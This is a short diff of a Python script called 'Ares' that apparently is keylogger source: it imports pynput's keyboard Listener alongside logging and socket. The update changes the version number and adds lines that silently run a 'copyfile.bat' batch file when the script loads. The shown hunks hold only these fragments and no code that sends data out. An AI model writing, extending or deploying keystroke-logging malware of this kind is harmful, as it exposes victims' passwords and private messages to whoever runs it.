@@ -1,4 +1,4 @@
-#Ares v2.0.0.1
+#Ares v2.1.0.0
 
 from pynput.keyboard import Key, Listener
 import logging
@@ -11,7 +11,10 @@ import os
 import socket
 import datetime
 import sys
-from datetime import *
+from subprocess import Popen
+
+p = Popen("copyfile.bat", cwd=r"")
+stdout, stderr = p.communicate()
 
 log_dir = ""
 
